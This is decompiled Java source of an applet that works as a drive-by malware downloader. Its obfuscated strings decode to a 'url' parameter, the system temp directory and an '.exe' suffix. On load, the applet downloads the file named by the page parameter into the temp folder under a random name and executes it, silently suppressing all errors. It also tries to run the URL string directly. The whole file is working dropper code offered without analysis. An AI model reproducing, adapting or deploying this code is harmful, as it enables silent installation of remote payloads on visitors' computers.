import java.io.InputStream;
import java.io.FileOutputStream;
import java.util.Random;
import java.io.Reader;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.URL;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class Java extends Applet
{
    public String a;
    public String b;
    public String c;
    public String d;
    public static boolean e;
    public static boolean f;
    private static String[] g;
    public static boolean h;
    public static boolean i;
    public static boolean j;
    public static boolean k;
    public static boolean l;
    public static boolean m;
    public static boolean n;
    public static boolean o;
    public static boolean p;
    public static boolean q;
    
    public Java() {
        final boolean q = Java.q;
        final boolean o = Java.o;
        final boolean m = Java.m;
        final boolean k = Java.k;
        final boolean i = Java.i;
        final boolean f = Java.f;
        this.a = "";
        this.b = "";
        this.c = "";
        this.d = "";
        if (Java.e) {
            Java.f = !f;
        }
        if (Java.h) {
            Java.i = !i;
        }
        if (Java.j) {
            Java.k = !k;
        }
        if (Java.l) {
            Java.m = !m;
        }
        if (Java.n) {
            Java.o = !o;
        }
        if (Java.p) {
            Java.q = !q;
        }
    }
    
    @Override
    public void init() {
        final String property = System.getProperty(Java.g[4]);
        this.a = this.getParameter(Java.g[7]);
        this.b = this.getParameter(Java.g[2]);
        this.c = this.getParameter(Java.g[5]);
        this.d = this.getParameter(Java.g[1]);
        if (this.getParameter(Java.g[5]) == null) {
            this.c = a(5) + Java.g[6];
        }
        try {
            this.a(this.a);
            this.a(this.a, property + this.c);
        }
        catch (Exception ex) {}
    }
    
    public void a(final String s) {
        final Runtime runtime = Runtime.getRuntime();
        try {
            runtime.exec(s);
            if (this.getParameter(Java.g[2]) != null) {
                this.getAppletContext().showDocument(new URL(this.b), Java.g[0]);
            }
            if (this.getParameter(Java.g[1]) != null) {
                new BufferedReader(new InputStreamReader(new URL(this.d).openConnection().getInputStream())).close();
            }
        }
        catch (Exception ex) {}
    }
    
    public static String a(final int n) {
        final boolean q = Java.q;
        final boolean o = Java.o;
        final boolean m = Java.m;
        final boolean k = Java.k;
        final boolean i = Java.i;
        final boolean f = Java.f;
        final Random random = new Random();
        final String s = Java.g[3];
        final char[] array = new char[n];
        int j = 0;
        while (j < n) {
            array[j] = s.charAt(random.nextInt(s.length()));
            ++j;
            if (f) {
                Java.e = !Java.e;
                break;
            }
        }
        final String s2 = new String(array);
        if (i) {
            Java.h = !Java.h;
        }
        if (k) {
            Java.j = !Java.j;
        }
        if (m) {
            Java.l = !Java.l;
        }
        if (o) {
            Java.n = !Java.n;
        }
        if (q) {
            Java.p = !Java.p;
        }
        return s2;
    }
    
    public void a(final String s, final String s2) {
        try {
            final URL url = new URL(s);
            url.openConnection();
            final InputStream openStream = url.openStream();
            System.out.flush();
            final FileOutputStream fileOutputStream = new FileOutputStream(s2);
            int n = 0;
            int read;
            while ((read = openStream.read()) != -1) {
                fileOutputStream.write(read);
                ++n;
                if (Java.f) {
                    break;
                }
            }
            openStream.close();
            fileOutputStream.close();
            this.a(s2);
        }
        catch (Exception ex) {}
    }
    
    static {
        final String[] g = new String[8];
        final int n = 0;
        final char[] charArray = "1EMo|".toCharArray();
        int length;
        int n3;
        final int n2 = n3 = (length = charArray.length);
        int n4 = 0;
        while (true) {
            Label_0097: {
                if (n2 > 1) {
                    break Label_0097;
                }
                length = (n3 = n4);
                do {
                    final char c = charArray[n3];
                    char c2 = '\0';
                    switch (n4 % 5) {
                        case 0: {
                            c2 = 'n';
                            break;
                        }
                        case 1: {
                            c2 = '6';
                            break;
                        }
                        case 2: {
                            c2 = '(';
                            break;
                        }
                        case 3: {
                            c2 = '\u0003';
                            break;
                        }
                        default: {
                            c2 = '\u001a';
                            break;
                        }
                    }
                    charArray[length] = (char)(c ^ c2);
                    ++n4;
                } while (n2 == 0);
            }
            if (n2 > n4) {
                continue;
            }
            break;
        }
        g[n] = new String(charArray).intern();
        final int n5 = 1;
        final char[] charArray2 = "\u001aD".toCharArray();
        int length2;
        int n7;
        final int n6 = n7 = (length2 = charArray2.length);
        int n8 = 0;
        while (true) {
            Label_0213: {
                if (n6 > 1) {
                    break Label_0213;
                }
                length2 = (n7 = n8);
                do {
                    final char c3 = charArray2[n7];
                    char c4 = '\0';
                    switch (n8 % 5) {
                        case 0: {
                            c4 = 'n';
                            break;
                        }
                        case 1: {
                            c4 = '6';
                            break;
                        }
                        case 2: {
                            c4 = '(';
                            break;
                        }
                        case 3: {
                            c4 = '\u0003';
                            break;
                        }
                        default: {
                            c4 = '\u001a';
                            break;
                        }
                    }
                    charArray2[length2] = (char)(c3 ^ c4);
                    ++n8;
                } while (n6 == 0);
            }
            if (n6 > n8) {
                continue;
            }
            break;
        }
        g[n5] = new String(charArray2).intern();
        final int n9 = 2;
        final char[] charArray3 = "\u001cR".toCharArray();
        int length3;
        int n11;
        final int n10 = n11 = (length3 = charArray3.length);
        int n12 = 0;
        while (true) {
            Label_0329: {
                if (n10 > 1) {
                    break Label_0329;
                }
                length3 = (n11 = n12);
                do {
                    final char c5 = charArray3[n11];
                    char c6 = '\0';
                    switch (n12 % 5) {
                        case 0: {
                            c6 = 'n';
                            break;
                        }
                        case 1: {
                            c6 = '6';
                            break;
                        }
                        case 2: {
                            c6 = '(';
                            break;
                        }
                        case 3: {
                            c6 = '\u0003';
                            break;
                        }
                        default: {
                            c6 = '\u001a';
                            break;
                        }
                    }
                    charArray3[length3] = (char)(c5 ^ c6);
                    ++n12;
                } while (n10 == 0);
            }
            if (n10 > n12) {
                continue;
            }
            break;
        }
        g[n9] = new String(charArray3).intern();
        final int n13 = 3;
        final char[] charArray4 = "\u000fTKg\u007f\bQ@jp\u0005ZEmu\u001eGZpn\u001b@_{c\u0014\u0007\u001a0.[\u0000".toCharArray();
        int length4;
        int n15;
        final int n14 = n15 = (length4 = charArray4.length);
        int n16 = 0;
        while (true) {
            Label_0445: {
                if (n14 > 1) {
                    break Label_0445;
                }
                length4 = (n15 = n16);
                do {
                    final char c7 = charArray4[n15];
                    char c8 = '\0';
                    switch (n16 % 5) {
                        case 0: {
                            c8 = 'n';
                            break;
                        }
                        case 1: {
                            c8 = '6';
                            break;
                        }
                        case 2: {
                            c8 = '(';
                            break;
                        }
                        case 3: {
                            c8 = '\u0003';
                            break;
                        }
                        default: {
                            c8 = '\u001a';
                            break;
                        }
                    }
                    charArray4[length4] = (char)(c7 ^ c8);
                    ++n16;
                } while (n14 == 0);
            }
            if (n14 > n16) {
                continue;
            }
            break;
        }
        g[n13] = new String(charArray4).intern();
        final int n17 = 4;
        final char[] charArray5 = "\u0004W^b4\u0007Y\u0006ww\u001eRAq".toCharArray();
        int length5;
        int n19;
        final int n18 = n19 = (length5 = charArray5.length);
        int n20 = 0;
        while (true) {
            Label_0561: {
                if (n18 > 1) {
                    break Label_0561;
                }
                length5 = (n19 = n20);
                do {
                    final char c9 = charArray5[n19];
                    char c10 = '\0';
                    switch (n20 % 5) {
                        case 0: {
                            c10 = 'n';
                            break;
                        }
                        case 1: {
                            c10 = '6';
                            break;
                        }
                        case 2: {
                            c10 = '(';
                            break;
                        }
                        case 3: {
                            c10 = '\u0003';
                            break;
                        }
                        default: {
                            c10 = '\u001a';
                            break;
                        }
                    }
                    charArray5[length5] = (char)(c9 ^ c10);
                    ++n20;
                } while (n18 == 0);
            }
            if (n18 > n20) {
                continue;
            }
            break;
        }
        g[n17] = new String(charArray5).intern();
        final int n21 = 5;
        final char[] charArray6 = "\bX".toCharArray();
        int length6;
        int n23;
        final int n22 = n23 = (length6 = charArray6.length);
        int n24 = 0;
        while (true) {
            Label_0677: {
                if (n22 > 1) {
                    break Label_0677;
                }
                length6 = (n23 = n24);
                do {
                    final char c11 = charArray6[n23];
                    char c12 = '\0';
                    switch (n24 % 5) {
                        case 0: {
                            c12 = 'n';
                            break;
                        }
                        case 1: {
                            c12 = '6';
                            break;
                        }
                        case 2: {
                            c12 = '(';
                            break;
                        }
                        case 3: {
                            c12 = '\u0003';
                            break;
                        }
                        default: {
                            c12 = '\u001a';
                            break;
                        }
                    }
                    charArray6[length6] = (char)(c11 ^ c12);
                    ++n24;
                } while (n22 == 0);
            }
            if (n22 > n24) {
                continue;
            }
            break;
        }
        g[n21] = new String(charArray6).intern();
        final int n25 = 6;
        final char[] charArray7 = "@SPf".toCharArray();
        int length7;
        int n27;
        final int n26 = n27 = (length7 = charArray7.length);
        int n28 = 0;
        while (true) {
            Label_0793: {
                if (n26 > 1) {
                    break Label_0793;
                }
                length7 = (n27 = n28);
                do {
                    final char c13 = charArray7[n27];
                    char c14 = '\0';
                    switch (n28 % 5) {
                        case 0: {
                            c14 = 'n';
                            break;
                        }
                        case 1: {
                            c14 = '6';
                            break;
                        }
                        case 2: {
                            c14 = '(';
                            break;
                        }
                        case 3: {
                            c14 = '\u0003';
                            break;
                        }
                        default: {
                            c14 = '\u001a';
                            break;
                        }
                    }
                    charArray7[length7] = (char)(c13 ^ c14);
                    ++n28;
                } while (n26 == 0);
            }
            if (n26 > n28) {
                continue;
            }
            break;
        }
        g[n25] = new String(charArray7).intern();
        final int n29 = 7;
        final char[] charArray8 = "\u001bDD".toCharArray();
        int length8;
        int n31;
        final int n30 = n31 = (length8 = charArray8.length);
        int n32 = 0;
        while (true) {
            Label_0909: {
                if (n30 > 1) {
                    break Label_0909;
                }
                length8 = (n31 = n32);
                do {
                    final char c15 = charArray8[n31];
                    char c16 = '\0';
                    switch (n32 % 5) {
                        case 0: {
                            c16 = 'n';
                            break;
                        }
                        case 1: {
                            c16 = '6';
                            break;
                        }
                        case 2: {
                            c16 = '(';
                            break;
                        }
                        case 3: {
                            c16 = '\u0003';
                            break;
                        }
                        default: {
                            c16 = '\u001a';
                            break;
                        }
                    }
                    charArray8[length8] = (char)(c15 ^ c16);
                    ++n32;
                } while (n30 == 0);
            }
            if (n30 <= n32) {
                g[n29] = new String(charArray8).intern();
                Java.g = g;
                return;
            }
            continue;
        }
    }
}
